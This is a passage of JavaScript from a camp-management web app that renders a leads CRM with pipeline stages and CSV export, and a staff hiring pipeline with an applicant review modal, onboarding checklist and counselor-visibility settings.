    var by={}; LEAD_STAGES.forEach(function(g){if(g.key!=='all')by[g.key]=0;});
    arr.forEach(function([,l]){var st=l.status||'new'; by[st]=(by[st]||0)+1;});
    var open=total-((by.enrolled||0)+(by.lost||0));
    var todayStr=new Date().toISOString().split('T')[0];
    var overdue=arr.filter(function([,l]){return l.nextFollowUp&&l.nextFollowUp<todayStr&&(l.status!=='enrolled'&&l.status!=='lost');}).length;

    var h='<div class="sec-hd"><div><h2 class="sec-title">Leads &amp; Inquiries</h2><p class="sec-desc">'+total+' lead'+(total!==1?'s':'')+' · '+open+' open'+(overdue?' · <span style="color:var(--err)">'+overdue+' follow-up'+(overdue!==1?'s':'')+' due</span>':'')+'</p></div>';
    h+='<div class="sec-actions"><button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.exportLeadsCSV()">↓ Export CSV</button><button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.copyInquiryLink()">🔗 Copy Inquiry Link</button><button class="me-btn me-btn--pri" onclick="CampistryMe.addLead()">+ Add Lead</button></div></div>';

    // Inquiry link banner
    h+='<div style="background:#fff;border:1px solid var(--s200);border-radius:var(--r);padding:12px 16px;margin-bottom:14px;display:flex;align-items:center;gap:12px;flex-wrap:wrap">';
    h+='<div style="flex:1;min-width:200px"><div style="font-size:.8rem;font-weight:600;color:var(--s500)">INQUIRY / REQUEST-INFO LINK</div>';
    h+='<div style="font-size:.85rem;color:var(--me);font-weight:600;word-break:break-all;margin-top:2px">'+esc(window.location.origin+'/campistry_inquiry.html')+'</div></div>';
    h+='<button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.copyInquiryLink()">Copy Link</button>';
    h+='<a href="campistry_inquiry.html" target="_blank" class="me-btn me-btn--sec me-btn--sm" style="text-decoration:none">Preview Form</a></div>';

    // Pipeline cards
    h+='<div style="display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap">';
    LEAD_STAGES.forEach(function(s){
        var count=s.key==='all'?total:(by[s.key]||0);
        var active=leadFilter===s.key;
        h+='<div class="click" onclick="CampistryMe.setLeadFilter(\''+s.key+'\')" style="flex:1;min-width:82px;background:'+(active?'var(--s50)':'#fff')+';border-radius:var(--r);padding:10px 12px;border:2px solid '+(active?s.color:'var(--s200)')+';text-align:center;cursor:pointer">';
        h+='<div style="font-size:1.2rem;font-weight:700;color:'+s.color+'">'+count+'</div>';
        h+='<div style="font-size:.62rem;font-weight:600;color:var(--s400);text-transform:uppercase;letter-spacing:.04em">'+s.label+'</div></div>';
    });
    h+='</div>';

    var list=arr.map(function([id,l]){l._id=id;return l;});
    if(leadFilter!=='all') list=list.filter(function(l){return (l.status||'new')===leadFilter;});
    list.sort(function(a,b){return(b.createdAt||'').localeCompare(a.createdAt||'');});

    if(!total){
        h+='<div class="me-empty"><h3>No leads yet</h3><p>Share your inquiry link on your website or socials — every "request info" lands here.</p><button class="me-btn me-btn--pri" onclick="CampistryMe.copyInquiryLink()">🔗 Copy Inquiry Link</button></div>';
    } else if(!list.length){
        h+='<div class="me-empty"><h3>No leads in this stage</h3></div>';
    } else {
        h+='<div class="me-card"><div class="me-tw"><table class="me-t"><thead><tr><th>Family</th><th>Camper interest</th><th>Received</th><th>Follow-up</th><th>Source</th><th>Status</th><th></th></tr></thead><tbody>';
        list.forEach(function(l){
            var fu=l.nextFollowUp?(l.nextFollowUp<todayStr?'<span style="color:var(--err);font-weight:600">'+esc(l.nextFollowUp)+' ⚠</span>':esc(l.nextFollowUp)):'—';
            var camp=[l.camperName,l.camperGrade?('Grade '+l.camperGrade):(l.camperAge?('Age '+l.camperAge):'')].filter(Boolean).join(' · ');
            h+='<tr class="click" onclick="CampistryMe.viewLead(\''+je(l._id)+'\')">';
            h+='<td class="bold">'+esc(l.parentName||'—')+'</td>';
            h+='<td style="font-size:.8rem">'+esc(camp||'—')+'</td>';
            h+='<td style="font-size:.78rem;color:var(--s500)">'+esc(l.createdDate||'')+'</td>';
            h+='<td style="font-size:.78rem">'+fu+'</td>';
            h+='<td style="font-size:.78rem;color:var(--s500)">'+esc(l.source||'—')+'</td>';
            h+='<td>'+bdg(_leadLabel(l.status||'new'),_leadType(l.status||'new'))+'</td>';
            h+='<td style="text-align:right;color:var(--s300)">›</td></tr>';
        });
        h+='</tbody></table></div></div>';
    }
    c.innerHTML=h;
}
function setLeadFilter(f){leadFilter=f;renderLeads();}
function viewLead(id){
    var l=leads[id]; if(!l)return; var st=l.status||'new';
    var opts=LEAD_STAGES.filter(function(g){return g.key!=='all';}).map(function(g){return '<option value="'+g.key+'"'+(st===g.key?' selected':'')+'>'+g.label+'</option>';}).join('');
    var h='<div style="max-height:70vh;overflow:auto">';
    h+='<div style="display:flex;justify-content:space-between;align-items:flex-start;gap:10px;margin-bottom:12px">';
    h+='<div><div style="font-size:1.05rem;font-weight:800">'+esc(l.parentName||'Lead')+'</div><div style="font-size:.8rem;color:var(--s500)">'+esc([l.camperName,l.camperGrade?('Grade '+l.camperGrade):(l.camperAge?('Age '+l.camperAge):'')].filter(Boolean).join(' · ')||'—')+'</div></div>';
    h+='<select class="me-input" style="width:auto" onchange="CampistryMe.setLeadStatus(\''+je(id)+'\',this.value)">'+opts+'</select>';
    h+='</div>';
    h+='<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;font-size:.82rem;margin-bottom:12px">';
    if(l.email)h+='<div><span style="color:var(--s400)">Email</span><br><a href="mailto:'+esc(l.email)+'" style="color:var(--me)">'+esc(l.email)+'</a></div>';
    if(l.phone)h+='<div><span style="color:var(--s400)">Phone</span><br><a href="tel:'+esc(l.phone)+'" style="color:var(--me)">'+esc(l.phone)+'</a></div>';
    if(l.interests)h+='<div style="grid-column:1/-1"><span style="color:var(--s400)">Interested in</span><br>'+esc(l.interests)+'</div>';
    if(l.source)h+='<div><span style="color:var(--s400)">Source</span><br>'+esc(l.source)+'</div>';
    h+='<div><span style="color:var(--s400)">Received</span><br>'+esc(l.createdDate||'')+'</div>';
    h+='</div>';
    if(l.message)h+='<div style="margin-bottom:12px;background:var(--s50);border-radius:var(--r);padding:10px 12px;font-size:.82rem"><span style="color:var(--s400)">Their message</span><div style="margin-top:2px;white-space:pre-wrap;color:var(--s700)">'+esc(l.message)+'</div></div>';
    // Follow-up date
    h+='<div class="fr" style="display:flex;gap:8px;align-items:end;margin-bottom:12px"><div class="me-field" style="flex:1;margin:0"><label>Next follow-up</label><input type="date" class="me-input" id="leadFU" value="'+esc(l.nextFollowUp||'')+'"></div><button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.setLeadFollowUp(\''+je(id)+'\')">Set</button></div>';
    // Activity log
    h+='<div style="margin-bottom:10px"><div style="font-size:.7rem;font-weight:700;color:var(--s400);text-transform:uppercase;margin-bottom:6px">Activity</div>';
    if((l.activity||[]).length){
        l.activity.slice().reverse().forEach(function(ac){h+='<div style="font-size:.8rem;padding:5px 0;border-bottom:1px solid var(--s100)"><span style="color:var(--s400)">'+esc(ac.date||'')+'</span> — '+esc(ac.text||'')+'</div>';});
    } else h+='<div style="font-size:.8rem;color:var(--s400)">No activity logged yet.</div>';
    h+='<div style="display:flex;gap:6px;margin-top:8px"><input class="me-input" id="leadAct" placeholder="Log a call, email, tour…" style="flex:1"><button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.addLeadActivity(\''+je(id)+'\')">Add</button></div></div>';
    // Notes
    h+='<div class="me-field"><label>Internal notes</label><textarea class="me-input" id="leadNote" rows="2">'+esc(l.notes||'')+'</textarea></div>';
    h+='<div style="display:flex;gap:6px;margin-top:8px;flex-wrap:wrap">';
    h+='<button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.saveLeadNotes(\''+je(id)+'\')">Save notes</button>';
    h+='<button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.copyRegLink()">🔗 Send registration link</button>';
    h+='<button class="me-btn me-btn--ghost me-btn--sm" style="color:var(--err);margin-left:auto" onclick="CampistryMe.deleteLead(\''+je(id)+'\')">Delete</button>';
    h+='</div></div>';
    showModal(esc(l.parentName||'Lead'),h);
}
function setLeadStatus(id,status){var l=leads[id];if(!l)return;l.status=status;if(!l.activity)l.activity=[];l.activity.push({date:today(),text:'Status → '+_leadLabel(status)});save();renderLeads();viewLead(id);toast('Moved to '+_leadLabel(status));}
function saveLeadNotes(id){var l=leads[id];if(!l)return;var el=document.getElementById('leadNote');if(el)l.notes=el.value;save();toast('Notes saved');}
function setLeadFollowUp(id){var l=leads[id];if(!l)return;var el=document.getElementById('leadFU');if(el)l.nextFollowUp=el.value;save();renderLeads();viewLead(id);toast('Follow-up set');}
function addLeadActivity(id){var l=leads[id];if(!l)return;var el=document.getElementById('leadAct');var t=el&&el.value.trim();if(!t)return;if(!l.activity)l.activity=[];l.activity.push({date:today(),text:t});save();viewLead(id);}
async function deleteLead(id){if(!leads[id])return;var ok=await confirmDialog({title:'Delete Lead?',message:'This lead will be permanently deleted.',confirmLabel:'Delete',danger:true});if(!ok)return;delete leads[id];save();closeModal('dynModal');renderLeads();toast('Lead deleted');}
function addLead(){
    var h='<div class="me-modal-form">';
    h+='<div class="me-field"><label>Parent / guardian name</label><input class="me-input" id="ldN"></div>';
    h+='<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px"><div class="me-field"><label>Email</label><input class="me-input" id="ldE"></div><div class="me-field"><label>Phone</label><input class="me-input" id="ldP"></div></div>';
    h+='<div style="display:grid;grid-template-columns:2fr 1fr;gap:10px"><div class="me-field"><label>Camper name</label><input class="me-input" id="ldC"></div><div class="me-field"><label>Grade / age</label><input class="me-input" id="ldG"></div></div>';
    h+='<div class="me-field"><label>Interested in</label><input class="me-input" id="ldI" placeholder="Session / program"></div>';
    h+='<div class="me-field"><label>Source</label><input class="me-input" id="ldS" placeholder="Referral, website, social…"></div></div>';
    showModal('Add Lead',h,function(){
        var name=document.getElementById('ldN').value.trim();
        if(!name){toast('Enter a parent name','error');return;}
        var id='lead_'+Date.now()+'_'+Math.random().toString(36).slice(2,6);
        leads[id]={parentName:name,email:document.getElementById('ldE').value.trim(),phone:document.getElementById('ldP').value.trim(),camperName:document.getElementById('ldC').value.trim(),camperGrade:document.getElementById('ldG').value.trim(),interests:document.getElementById('ldI').value.trim(),source:document.getElementById('ldS').value.trim()||'Manual',status:'new',createdDate:today(),createdAt:new Date().toISOString(),notes:'',activity:[]};
        save();closeModal('dynModal');renderLeads();toast('Lead added');
    });
}
function copyInquiryLink(){var url=window.location.origin+'/campistry_inquiry.html';try{navigator.clipboard&&navigator.clipboard.writeText(url);}catch(e){}toast('Inquiry link copied');}
function exportLeadsCSV(){
    var rows=[['Parent','Email','Phone','Camper','Grade/Age','Interested in','Source','Status','Received','Next follow-up','Notes']];
    Object.values(leads).forEach(function(l){
        rows.push([l.parentName||'',l.email||'',l.phone||'',l.camperName||'',l.camperGrade||l.camperAge||'',l.interests||'',l.source||'',_leadLabel(l.status||'new'),l.createdDate||'',l.nextFollowUp||'',(l.notes||'').replace(/\n/g,' ')]);
    });
    var csv='﻿'+rows.map(function(r){return r.map(function(x){return '"'+String(x==null?'':x).replace(/"/g,'""')+'"';}).join(',');}).join('\n');
    dlFile(csv,'leads.csv','text/csv');
}

// ═══════════════════════════════════════════════════════════════
// STAFFING — hiring pipeline / applicant tracking (mirrors Registration).
// Staff apply at campistry_staff_apply.html → campistryMe.staffApplications;
// the office moves them through Applied → Screening → Interview → Reference →
// Offered → Hired, requests references, and runs an onboarding checklist.
// ═══════════════════════════════════════════════════════════════
var STAFF_STAGES=[
    {key:'all',label:'All',color:'var(--s700)'},
    {key:'applied',label:'Applied',color:'var(--s500)'},
    {key:'screening',label:'Screening',color:'#3B82F6'},
    {key:'interview',label:'Interview',color:'#8B5CF6'},
    {key:'reference',label:'Reference',color:'var(--me)'},
    {key:'offered',label:'Offered',color:'#0EA5E9'},
    {key:'hired',label:'Hired',color:'var(--ok)'},
    {key:'declined',label:'Declined',color:'var(--err)'}
];
var STAFF_ONBOARD=[['contract','Signed offer / contract'],['i9','I-9 verified'],['w4','W-4 / tax forms'],['bgcheck','Background check cleared'],['orientation','Orientation complete']];
function _staffStatusType(s){return s==='hired'?'ok':s==='declined'?'err':s==='offered'?'info':s==='reference'?'warn':'gray';}
function _staffLabel(s){var x=STAFF_STAGES.find(function(g){return g.key===s;});return x?x.label:(s||'Applied');}
// The pipeline's forward path — used to drive the single "Advance" action
// (row button + modal footer) instead of making every stage transition its
// own named button. 'declined' isn't part of this path — it's reached via
// a separate Decline action from any stage, not by advancing into it.
var STAFF_ADVANCE_ORDER=['applied','screening','interview','reference','offered','hired'];
function _staffNextStage(status){
    var idx=STAFF_ADVANCE_ORDER.indexOf(status);
    if(idx<0||idx>=STAFF_ADVANCE_ORDER.length-1)return null;
    return STAFF_ADVANCE_ORDER[idx+1];
}

// ── What counselors can see in Campistry Lite ─────────────────────────
// The head counselor's call, per camp. Catalogue lives in
// campistry_visibility.js so Lite enforces exactly this list.
var _visOpen=false;
function _vis(){ return (window.CampistryVisibility||null); }
function visibilityPolicy(){
    var V=_vis(); if(!V)return {};
    return counselorVisibility||V.defaults();
}
function toggleVisibilityPanel(){ _visOpen=!_visOpen; _refreshPplIfActive(); }
function setCounselorVisibility(key,on){
    var V=_vis(); if(!V)return;
    if(!counselorVisibility)counselorVisibility=V.defaults();
    counselorVisibility[key]=!!on;
    save();
    _refreshPplIfActive();
}
function resetCounselorVisibility(){
    var V=_vis(); if(!V)return;
    counselorVisibility=V.defaults();
    save(); _refreshPplIfActive();
    toast('Reset to defaults');
}
function _visibilityPanelHTML(){
    var V=_vis();
    if(!V)return '';
    var pol=visibilityPolicy();
    var items=V.toggleable();
    var onCount=items.filter(function(f){return V.isVisible(pol,f.key)}).length;
    var h='<div style="background:#fff;border:1px solid var(--s200);border-radius:var(--r);margin-bottom:14px;overflow:hidden">';
    h+='<button style="width:100%;display:flex;align-items:center;gap:10px;padding:12px 16px;background:none;border:none;cursor:pointer;text-align:left" onclick="CampistryMe.toggleVisibilityPanel()">';
    h+='<div style="flex:1"><div style="font-size:.85rem;font-weight:700;color:var(--s700)">What counselors can see in Campistry Lite</div>';
    h+='<div style="font-size:.76rem;color:var(--s500);margin-top:2px">'+onCount+' of '+items.length+' details shared · applies to every counselor</div></div>';
    h+='<span style="font-size:.8rem;color:var(--s400)">'+(_visOpen?'Hide':'Change')+'</span></button>';
    if(_visOpen){
        h+='<div style="padding:0 16px 14px">';
        h+='<p style="font-size:.76rem;color:var(--s500);margin:0 0 10px">Counselors always see a camper\'s name, bunk, grade and division — they can\'t do the job without it. Everything below is your call. Anything switched off is never sent to their phone, not just hidden.</p>';
        items.forEach(function(f){
            var on=V.isVisible(pol,f.key);
            h+='<label style="display:flex;align-items:center;gap:10px;padding:7px 0;border-bottom:1px solid var(--s100);font-size:.84rem;cursor:pointer">'
              +'<input type="checkbox" '+(on?'checked':'')+' onchange="CampistryMe.setCounselorVisibility(\''+je(f.key)+'\',this.checked)">'
              +'<span style="flex:1">'+esc(f.label)+'</span>'
              +'<span style="font-size:.7rem;font-weight:700;color:'+(on?'var(--ok)':'var(--s400)')+'">'+(on?'Shared':'Hidden')+'</span>'
              +'</label>';
        });
        h+='<button class="me-btn me-btn--ghost me-btn--sm" style="margin-top:10px" onclick="CampistryMe.resetCounselorVisibility()">Reset to defaults</button>';
        h+='</div>';
    }
    h+='</div>';
    return h;
}

// Review modal for a staff applicant — same appViewModal shell, av-sec/
// av-row card sections, and live form-config-driven rendering as
// viewApplication() uses for Registration: section order/labels/visibility
// come from getStaffFormConfig()/SFC_SECTIONS/SFC_FIELD_CATALOG, so this
// mirrors whatever the camp has actually configured on the public staff
// application form. Bunk placement / onboarding / internal notes are
// admin-only additions that aren't part of that public form, so — like
// Registration's Post-Acceptance/Internal Notes — they render as trailing
// sections outside the config-driven order.
function viewStaffApp(id){
    var a=staffApplications[id]; if(!a)return;
    var st=a.status||'applied';
    var sc=_staffStatusType(st);
    var stOpts=STAFF_STAGES.filter(function(g){return g.key!=='all';}).map(function(g){return '<option value="'+g.key+'"'+(st===g.key?' selected':'')+'>'+g.label+'</option>';}).join('');
    var name=a.name||((a.first||'')+' '+(a.last||''))||'Applicant';

    function isSafeImageDataUrl(s){return typeof s==='string'&&/^data:image\/(png|jpeg|jpg|gif|webp);base64,[A-Za-z0-9+\/=]+$/.test(s);}
    var headPhoto=(a.photo&&isSafeImageDataUrl(a.photo))?'<img src="'+a.photo+'" style="width:40px;height:40px;object-fit:cover;border-radius:9px;flex-shrink:0">':'';
    var staffIdBadge=a.staffId?' <span style="font-family:monospace;font-size:.72rem;color:var(--s400);background:var(--s100);padding:2px 8px;border-radius:var(--r);vertical-align:1px">Staff ID: #'+esc(String(a.staffId).padStart(4,'0'))+'</span>':'';
    var head='<div style="display:flex;justify-content:space-between;align-items:flex-start;gap:10px">'
        +'<div style="display:flex;align-items:center;gap:10px">'+headPhoto+'<div><h3 style="font-size:1.1rem;font-weight:700;color:var(--s800);margin:0">'+esc(name)+staffIdBadge+'</h3>'
        +'<div style="display:flex;gap:5px;margin-top:5px">'+bdg(_staffLabel(st),sc)+((a.positions||[]).length?' '+bdg((a.positions||[]).join(', '),'gray'):'')+'</div></div></div>'
        +'<div style="display:flex;align-items:center;gap:8px;flex-shrink:0"><select class="fs" style="width:auto;padding:5px 8px;font-size:.78rem" onchange="CampistryMe.setStaffStatus(\''+je(id)+'\',this.value)">'+stOpts+'</select>'
        +'<button class="me-modal-x" onclick="CampistryMe.closeModal(\'appViewModal\')">&times;</button></div></div>';
    document.getElementById('avHead').innerHTML=head;

    function row(l,v){if(!v)return'';return'<div class="av-row"><span class="av-row-l">'+esc(l)+'</span><span class="av-row-v">'+esc(v)+'</span></div>'}
    function rowRaw(l,v){if(!v)return'';return'<div class="av-row"><span class="av-row-l">'+esc(l)+'</span><span class="av-row-v">'+v+'</span></div>'}

    var sfc=getStaffFormConfig();
    function sFieldOn(fid){var cfg=(sfc.fields||{})[fid]; return cfg?cfg.enabled!==false:true;}
    function sLabel(fid,fallback){var cfg=(sfc.fields||{})[fid]; return (cfg&&cfg.label)||fallback;}
    function sSectionOn(key){var cfg=(sfc.sections||{})[key]; if(cfg)return cfg.enabled!==false; var def=SFC_SECTIONS.filter(function(s){return s.key===key;})[0]; return def?def.default:true;}

    // About/Role stay in the always-visible snapshot ("who is this, can I
    // reach them, what did they apply for" — no click needed). Experience,
    // References and Consent are more of an as-needed lookup during review,
    // so they collapse into accordions (same _accCard()/_toggleAcc()
    // component the Roster profile and Form Builder already use) — same
    // idea as the Roster camper-profile cleanup, applied here.
    var SECTION_RENDERERS={
        about:function(){
            var h='';
            if(a.photo&&sFieldOn('photo')&&isSafeImageDataUrl(a.photo)){
                h+='<img src="'+a.photo+'" style="width:72px;height:72px;object-fit:cover;border-radius:10px;border:1px solid var(--s200);margin-bottom:8px">';
            }
            if(sFieldOn('first')||sFieldOn('last'))h+=row('Name',name);
            if(a.email&&sFieldOn('email'))h+=rowRaw(sLabel('email','Email'),'<a href="mailto:'+esc(a.email)+'" style="color:var(--me)">'+esc(a.email)+'</a>');
            if(a.phone&&sFieldOn('phone'))h+=rowRaw(sLabel('phone','Phone'),'<a href="tel:'+esc(a.phone)+'" style="color:var(--me);font-weight:600">'+esc(a.phone)+'</a>');
            if(sFieldOn('dob'))h+=row(sLabel('dob','Date of Birth'),a.dob);
            if(sFieldOn('street'))h+=row(sLabel('street','Street'),a.street);
            if(sFieldOn('city'))h+=row(sLabel('city','City'),a.city);
            if(sFieldOn('state'))h+=row(sLabel('state','State'),a.state);
            if(sFieldOn('zip'))h+=row(sLabel('zip','ZIP'),a.zip);
            return {title:'About',body:h,snapshot:true};
        },
        role:function(){
            var h=row('Position(s)',(a.positions||[]).join(', '));
            if((sFieldOn('availStart')||sFieldOn('availEnd'))&&(a.availStart||a.availEnd))h+=row('Availability',(a.availStart||'?')+' – '+(a.availEnd||'?'));
            return {title:'Role & Availability',body:h,snapshot:true};
        },
        experience:function(){
            var h='';
            if((a.certifications||[]).length)h+=row('Certifications',a.certifications.join(', '));
            if(sFieldOn('education'))h+=row(sLabel('education','Education'),a.education);
            if(sFieldOn('experience'))h+=row(sLabel('experience','Experience'),a.experience);
            if(sFieldOn('resume')&&a.resume&&a.resume.data)h+='<div style="margin-top:4px"><a href="'+esc(a.resume.data)+'" download="'+esc(a.resume.name||'resume')+'" class="me-btn me-btn--sec me-btn--sm">📎 '+esc(a.resume.name||'Resume')+'</a></div>';
            return {title:'Experience & Certifications',body:h||'<div style="font-size:.82rem;color:var(--s400)">Nothing on file.</div>'};
        },
        references:function(){
            var refs=a.references||[];
            var h;
            if(refs.length){
                h=refs.map(function(r,ri){
                    var rst=r.status||'pending';
                    var rc=rst==='received'?'ok':rst==='requested'?'warn':'gray';
                    return '<div style="display:flex;align-items:center;gap:8px;padding:7px 0;border-bottom:1px solid var(--s100);font-size:.82rem">'
                        +'<div style="flex:1"><strong>'+esc(r.name||'—')+'</strong>'+(r.relationship?' <span style="color:var(--s400)">('+esc(r.relationship)+')</span>':'')+'<br><span style="color:var(--s500);font-size:.76rem">'+esc([r.email,r.phone].filter(Boolean).join(' · '))+'</span></div>'
                        +bdg(rst,rc)
                        +'<button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.cycleRef(\''+je(id)+'\','+ri+')">'+(rst==='received'?'Reset':rst==='requested'?'Mark received':'Request')+'</button>'
                        +'</div>';
                }).join('');
            } else h='<div style="font-size:.82rem;color:var(--s400)">No references provided.</div>';
            return {title:'References',body:h,badge:refs.length?String(refs.length):''};
        },
        consent:function(){
            if(!a.source)return null;
            return {title:'Consent',body:row('How they heard about us',a.source)};
        }
    };
    var order=(sfc.sectionOrder&&sfc.sectionOrder.length)?sfc.sectionOrder.slice():SFC_SECTIONS.map(function(s){return s.key;});
    SFC_SECTIONS.forEach(function(s){ if(order.indexOf(s.key)<0)order.push(s.key); });
    var snap='',acc='';
    order.forEach(function(key){
        if(!sSectionOn(key))return;
        var fn=SECTION_RENDERERS[key];
        if(!fn)return;
        var res=fn();
        if(!res)return;
        if(res.snapshot)snap+='<div class="av-sec"><div class="av-sec-hd">'+res.title+'</div>'+res.body+'</div>';
        else acc+=_accCard(res.title,res.body,{badge:res.badge,key:'sa_'+id+'_'+key});
    });

    // Contract & Pay (once an offer is on the table) — position, pay terms
    // and a link the candidate opens on their OWN device to review and
    // accept, same shareable-link pattern as the registration/staff
    // application links. Pay type/rate reuse Payroll's own PAY_TYPES so
    // there's one source of truth for how pay is structured, not two.
    if(st==='offered'||st==='hired'){
        var ctr=a.contract||{status:'none'};
        var core=PC();
        var ctrBody='';
        if(ctr.status==='accepted'){
            ctrBody+='<div style="font-size:.82rem;color:var(--ok);font-weight:600;margin-bottom:8px">✓ Accepted by '+esc(ctr.acceptedName||'the candidate')+' on '+esc((ctr.acceptedAt||'').slice(0,10))+'</div>';
        }else if(ctr.status==='sent'){
            ctrBody+='<div style="font-size:.82rem;color:var(--me);font-weight:600;margin-bottom:8px">Sent — awaiting acceptance</div>';
        }
        if(ctr.position||ctr.payRate){
            var rl=(core&&(core.PAY_TYPES.filter(function(p){return p.id===ctr.payType})[0]||{}).rateLabel)||'Rate';
            ctrBody+=row('Position',ctr.position);
            if(ctr.payRate)ctrBody+=row(rl,fm(ctr.payRate));
            if(ctr.startDate||ctr.endDate)ctrBody+=row('Dates',(ctr.startDate||'?')+' – '+(ctr.endDate||'?'));
        }else{
            ctrBody+='<div style="font-size:.82rem;color:var(--s400)">No contract terms set yet.</div>';
        }
        ctrBody+='<div style="display:flex;gap:6px;margin-top:8px;flex-wrap:wrap">';
        ctrBody+='<button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.openStaffContractModal(\''+je(id)+'\')">'+(ctr.status==='none'?'Set Up Contract':'Edit Contract')+'</button>';
        if(ctr.status!=='none')ctrBody+='<button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.copyStaffContractLink(\''+je(id)+'\')">🔗 Copy Link</button>';
        ctrBody+='</div>';
        snap+='<div class="av-sec"><div class="av-sec-hd">Contract & Pay</div>'+ctrBody+'</div>';
    }

    // Bunk placement (once hired) — admin-only, not part of the public
    // form. Hiring isn't finished until they're on a bunk — that's what
    // gives them a schedule in Lite and lets pickup notifications reach them.
    // Stays in the always-visible snapshot: whether this hire is actually
    // set up to work is not a detail worth hiding behind a click.
    if(st==='hired'){
        var bpBody='';
        var mine=bunksForStaffEmail(a.email);
        var free=allBunkNames().filter(function(bn){return mine.indexOf(bn)<0});
        if(!String(a.email||'').trim()){
            bpBody+='<div style="font-size:.82rem;color:var(--err)">No email on this application, so they can\'t sign in to Campistry Lite or be notified. Add one before placing them.</div>';
        }else if(mine.length){
            bpBody+=mine.map(function(bn){
                return '<div style="display:flex;align-items:center;gap:8px;padding:4px 0;font-size:.83rem">'
                    +'<span style="flex:1">'+esc(bn)+'</span>'
                    +'<button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.unassignHiredFromBunk(\''+je(id)+'\',\''+je(bn)+'\')">Remove</button></div>';
            }).join('');
        }else{
            bpBody+='<div style="font-size:.82rem;color:var(--s500);margin-bottom:6px">Not on a bunk yet — they won\'t see a schedule in Campistry Lite.</div>';
        }
        if(String(a.email||'').trim()&&free.length){
            bpBody+='<select class="fs" style="margin-top:6px" onchange="if(this.value)CampistryMe.assignHiredToBunk(\''+je(id)+'\',this.value)">'
              +'<option value="">— Add to a bunk —</option>'
              +free.map(function(bn){return '<option value="'+esc(bn)+'">'+esc(bn)+'</option>'}).join('')
              +'</select>';
        }
        snap+='<div class="av-sec"><div class="av-sec-hd">Bunk Placement</div>'+bpBody+'</div>';
    }
    // Onboarding checklist (once offered/hired) — an active to-do list during
    // those stages, so it defaults open rather than collapsed.
    if(st==='offered'||st==='hired'){
        var ob=a.onboarding||{};
        var obBody=STAFF_ONBOARD.map(function(item){
            return '<label style="display:flex;align-items:center;gap:8px;font-size:.83rem;padding:3px 0;cursor:pointer"><input type="checkbox" '+(ob[item[0]]?'checked':'')+' onchange="CampistryMe.toggleOnboard(\''+je(id)+'\',\''+item[0]+'\')"> '+esc(item[1])+'</label>';
        }).join('');
        var obDone=STAFF_ONBOARD.filter(function(item){return ob[item[0]]}).length;
        acc+=_accCard('Onboarding Checklist',obBody,{open:true,badge:obDone+'/'+STAFF_ONBOARD.length,key:'sa_'+id+'_onboard'});
    }
    // Post-Hire Form responses — mirrors viewApplication()'s e.postAccept
    // display for campers. Only rendered once the hire has actually
    // submitted; before that the footer's "Post-Hire Form" button (no
    // checkmark yet) is the only indicator, same as the camper Pipeline.
    if(st==='hired'&&a.postHire){
        var ph=a.postHire;
        var phBody=row('Submitted',ph.submittedDate?new Date(ph.submittedDate).toLocaleString():'');
        phBody+=row('T-Shirt Size',ph.shirt);
        phBody+=row('Arrival Date',ph.arrivalDate);
        phBody+=row('Housing Preference',ph.housing);
        phBody+=row('Emergency Contact',(ph.emName||'')+(ph.emRelation?' ('+ph.emRelation+')':''));
        phBody+=row('Emergency Phone',ph.emPhone);
        phBody+=row('Handbook Acknowledged',ph.handbookAck?'Yes':(ph.handbookAck===false?'No':''));
        phBody+=row('Photo/Media Permission',ph.photoConsent?'Yes':(ph.photoConsent===false?'No':''));
        if(ph.policiesAgreed&&ph.policiesAgreed.length){
            phBody+='<div style="margin-top:8px;font-weight:600;font-size:.8rem;color:var(--s700)">Camp Policies &amp; Requirements</div>';
            phBody+=rowRaw('Agreed to',ph.policiesAgreed.map(function(p){return esc(p);}).join('<br>'));
            phBody+=row('Signed',ph.policiesSignature);
            if(ph.policiesSignedAt)phBody+=row('Signed On',new Date(ph.policiesSignedAt).toLocaleString());
        }
        if(ph.customAnswers&&Object.keys(ph.customAnswers).length){
            var phLabels=ph.customQuestionLabels||[];
            Object.entries(ph.customAnswers).forEach(function([key,val]){
                var idx=parseInt(key.replace('q',''));var label=phLabels[idx]||('Question '+(idx+1));
                phBody+=row(label,Array.isArray(val)?val.join(', '):val);
            });
        }
        (ph.customSectionAnswers||[]).forEach(function(secAns){
            phBody+='<div style="margin-top:8px;font-weight:600;font-size:.8rem;color:var(--s700)">'+esc(secAns.label||'Additional Section')+'</div>';
            var fieldLabels=secAns.fieldLabels||[];
            Object.entries(secAns.answers||{}).forEach(function([key,val]){
                var idx=parseInt(key.replace('f',''));var label=fieldLabels[idx]||('Field '+(idx+1));
                phBody+=row(label,Array.isArray(val)?val.join(', '):val);
            });
        });
        acc+=_accCard('Post-Hire Form Responses',phBody,{open:true,key:'sa_'+id+'_posthire'});
    }
    // Internal Notes — opens by default once something's actually been
    // written, so existing notes aren't hidden behind an extra click.
    var notesBody='<textarea id="staffNote" style="width:100%;padding:8px 10px;border:1.5px solid var(--s200);border-radius:var(--r);font-size:.82rem;font-family:var(--font);min-height:60px;resize:vertical;outline:none" placeholder="Interview notes, impressions…">'+(a.adminNotes?esc(a.adminNotes):'')+'</textarea>'
        +'<button class="me-btn me-btn--sec me-btn--sm" style="margin-top:6px" onclick="CampistryMe.saveStaffNotes(\''+je(id)+'\')">Save Notes</button>';
    acc+=_accCard('Internal Notes',notesBody,{open:!!a.adminNotes,key:'sa_'+id+'_notes'});

    document.getElementById('avBody').innerHTML=snap+'<div style="margin-top:'+(snap?'14px':'0')+'">'+acc+'</div>';

    // Footer
    var next=_staffNextStage(st);
    var f='';
    if(st==='declined'){
        f+='<button class="me-btn me-btn--pri" onclick="CampistryMe.setStaffStatus(\''+je(id)+'\',\'applied\')">Reconsider</button>';
    }else{
